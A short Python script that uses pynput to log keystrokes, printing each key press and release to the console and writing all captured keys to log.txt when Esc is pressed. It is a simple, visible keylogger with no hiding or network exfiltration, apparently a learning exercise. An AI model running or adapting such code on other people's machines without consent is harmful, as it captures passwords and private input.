import pynput
from pynput.keyboard import Key, Listener


def writeFile(keys):
    
    f = open("log.txt", "w")
    
    for key in keys:
        # removing space
        k = str(key).replace("'", "")
        f.write(k)

        # every keystroke for readablity
        f.write(" ")


keys = []


def onPress(key):
    keys.append(key)

    try:
        print(f"alphanumeric key {key.char} pressed")
    except AttributeError:
        print(f"special key {key}")


def onRelease(key):
    print("{0} released".format(key))
    if key == Key.esc:
        writeFile(keys)
        # stop Listener
        return False


with Listener(on_press=onPress, on_release=onRelease) as listner:
    listner.join()
